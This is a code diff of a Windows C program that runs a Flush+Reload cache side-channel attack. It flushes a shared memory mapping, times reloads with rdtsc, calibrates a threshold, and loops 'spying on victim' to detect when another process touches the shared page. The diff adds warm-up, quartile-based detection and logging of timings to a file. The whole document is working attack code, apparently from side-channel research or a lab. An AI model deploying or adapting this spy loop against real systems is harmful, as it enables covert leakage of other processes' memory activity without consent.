@@ -11,29 +11,28 @@
 #endif
 
 
+#define SLEEP_TIME_MICROSEC 10
+#define THRESHOLD_SCALING 0.8
+
+
 #define BUF_SIZE 2
 char szName[] = "MyFileMappingObject";
 
 
 
 
-void sleep_us(LONGLONG microseconds) {
-    // Requires Windows 10 v1803+
-    HANDLE timer = CreateWaitableTimerExW(
-        NULL, 
-        NULL, 
-        CREATE_WAITABLE_TIMER_HIGH_RESOLUTION, 
-        TIMER_ALL_ACCESS
-    );
-    if (!timer) return;
+void sleep_us(HANDLE timer, LONGLONG microseconds) {
 
     // Negative values indicate relative time in 100-nanosecond intervals
     LARGE_INTEGER dueTime;
     dueTime.QuadPart = -(microseconds * 10);
 
-    SetWaitableTimer(timer, &dueTime, 0, NULL, NULL, FALSE);
+    if (!SetWaitableTimer(timer, &dueTime, 0, NULL, NULL, FALSE)) {
+        printf("SetWaitableTimer failed: %lu\n", GetLastError());
+        return;
+    }
+
     WaitForSingleObject(timer, INFINITE);
-    CloseHandle(timer);
 }
 
 
@@ -56,6 +55,13 @@ uint64_t findMedian(uint64_t arr[], uint64_t n) {
     else {
         return arr[n / 2];
     }
+}
+
+uint64_t findFirstQuartile(uint64_t arr[], uint64_t n) {
+    // 1. Sort the array in ascending order
+    qsort(arr, n, sizeof(uint64_t), compare);
+
+    return arr[n / 4];
 }
 
 
@@ -94,9 +100,49 @@ int main()
 
     volatile const char* target = (volatile const char*) pBuf;
 
+    HANDLE hTimer = CreateWaitableTimerExW(
+        NULL,
+        NULL,
+        CREATE_WAITABLE_TIMER_HIGH_RESOLUTION,
+        TIMER_ALL_ACCESS
+    );
+
+    if (hTimer == NULL) {
+        printf("CreateWaitableTimerExW failed: %lu\n", GetLastError());
+        UnmapViewOfFile(pBuf);
+        CloseHandle(hMapFile);
+        return 1;
+    }
+
+
+   printf("\nWarming up...");
+
+   #define WARMINGUP_SAMPLES 40000
+
+   for(int i=0; i<WARMINGUP_SAMPLES; i++){
+        uint64_t start, end;
+        unsigned int aux;
+
+        _mm_lfence();
+        start = __rdtsc();
+        _mm_lfence();
+        char a = *target;
+        end = __rdtscp(&aux);
+        _mm_lfence();
+
+        //timings[i] = end - start;
+        _mm_clflush(pBuf);
+        _mm_mfence();
+
+        checksum ^= a;  // Statement to make sure a is used, so compiler does not optimize it away
+        //sleep_us(hTimer, SLEEP_TIME_MICROSEC);
+    }
+
+    printf("\nWarming up completed!\n");
+
     printf("\nProfiling...");
 
-    #define PROFILING_SAMPLES 1000
+    #define PROFILING_SAMPLES 40000
     uint64_t timings[PROFILING_SAMPLES];
 
     for(int i=0; i<PROFILING_SAMPLES; i++){
@@ -115,18 +161,27 @@ int main()
         _mm_mfence();
 
         checksum ^= a;  // Statement to make sure a is used, so compiler does not optimize it away
-        sleep_us(400);
+        //sleep_us(hTimer, SLEEP_TIME_MICROSEC);
     }
+
+    FILE *fptr = fopen("alternatetimings.txt", "w");
+    for (int i = 0; i < PROFILING_SAMPLES; i++)
+    {
+        fprintf(fptr, "%llu\n", (unsigned long long)timings[i]);
+        //printf("%llu\n", (unsigned long long)timings[i]);
+    }
+    //fclose(fptr);
 
     uint64_t median = findMedian(timings, PROFILING_SAMPLES);
 
     printf("\nProfiling completed!\n");
-    printf("Median : %" PRIu64 "\n\n", median);
+    printf("Median : %" PRIu64 "\n", median);
+    printf("Threshold : %f\n\n", median*THRESHOLD_SCALING);
 
 
-    printf("\nStarting spying on victim...");
+    printf("\nStarting spying on victim...\n");
 
-    #define TESTING_SAMPLES 1000
+    #define TESTING_SAMPLES 600
     uint64_t testing_timings[TESTING_SAMPLES];
 
     while(1){
@@ -151,14 +206,21 @@ int main()
 
             checksum ^= a;
             //Sleep(1);
-            sleep_us(400);
+            //sleep_us(hTimer, SLEEP_TIME_MICROSEC);
         }
 
-        uint64_t current_median = findMedian(testing_timings, TESTING_SAMPLES);
-        if(current_median < median*0.75){
-            printf("Victim highly likely accessing memory!!");
+        for (int i = 0; i < TESTING_SAMPLES; i++)
+        {
+            fprintf(fptr, "%llu\n", (unsigned long long)testing_timings[i]);
+            //printf("%llu\n", (unsigned long long)timings[i]);
         }
-        printf("Current Median %" PRIu64 "\n", findMedian(testing_timings, TESTING_SAMPLES));
+
+        uint64_t current_median = findFirstQuartile(testing_timings, TESTING_SAMPLES);
+        if(current_median < median*THRESHOLD_SCALING){
+            printf("Victim highly likely accessing memory!! ");
+        }
+        printf("Current Median %" PRIu64 "\n", current_median);
+
 
     }
 
